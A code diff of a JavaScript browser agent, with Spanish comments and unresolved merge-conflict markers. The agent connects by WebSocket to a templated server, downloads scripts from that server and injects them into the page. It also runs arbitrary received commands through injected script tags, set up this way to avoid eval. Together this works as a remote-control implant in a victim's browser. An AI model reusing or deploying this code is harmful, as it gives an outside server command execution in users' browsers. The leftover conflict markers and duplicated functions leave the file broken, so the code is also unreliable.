@@ -3,7 +3,7 @@ function sendMessage(msg) {
     webSocket.send(encrypt(mes));
 }
 
-function loadScript(url) {
+function loadScriptFromURL(url) {
     // Si la URL no viene completa, se completa la URL para descargar el script del servidor
     if (!(/(http(s?)):\/\//i.test(url))) {
         url = "http://$host:$hport/" + url
@@ -19,8 +19,34 @@ function loadScript(url) {
     })
 }
 
+<<<<<<< HEAD
 const webSocket = new WebSocket("ws://$host:$wport");
 webSocket.onopen = (e) => {
+=======
+function loadScript(script) {
+    var node = document.createElement("script");
+    node.innerHTML = script;
+    document.getElementsByTagName("head")[0].appendChild(node);
+    node.remove()
+}
+
+
+// Workaround para no utilizar eval
+var doExec = function () { };
+
+function execute(cmd) {
+
+    let node = document.createElement("script");
+    node.innerHTML = "doExec = function(){ return " + cmd + "}";
+    node.setAttribute('id', 'exec-')
+    document.getElementsByTagName("head")[0].appendChild(node);
+    node.remove()
+    return doExec();
+}
+
+const webSocket = new WebSocket("ws://" + host + ":" + wsport);
+webSocket.onopen = (event) => {
+>>>>>>> e555594688ce80c742f1401e128f65a376deac94
     sendMessage({ type: 1 });
 };
 
@@ -93,6 +119,7 @@ function hex2a(hexx) {
     for (var i = 0; i < hex.length; i += 2)
         str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
     return str;
+<<<<<<< HEAD
 }
 
 
@@ -107,4 +134,6 @@ function execute(cmd) {
     document.getElementsByTagName("head")[0].appendChild(node);
     node.remove()
     return doExec();
+=======
+>>>>>>> e555594688ce80c742f1401e128f65a376deac94
 }
